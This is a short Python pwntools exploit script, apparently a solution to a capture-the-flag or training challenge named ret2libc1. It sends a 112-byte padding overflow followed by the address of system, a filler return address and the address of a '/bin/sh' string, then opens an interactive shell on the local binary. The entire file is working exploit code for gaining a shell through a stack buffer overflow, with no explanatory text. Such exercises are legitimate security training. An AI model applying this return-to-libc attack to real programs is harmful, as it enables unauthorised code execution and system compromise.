from pwn import *


offset = 112

system_addr = 0x08048460
bin_sh_addr = 0x08048720


proc = process("./pwn/ret2libc1/ret2libc1")
proc.sendline(b'A'*offset\
               + p32(system_addr) \
                + b'AAAA' + p32(bin_sh_addr))
proc.interactive()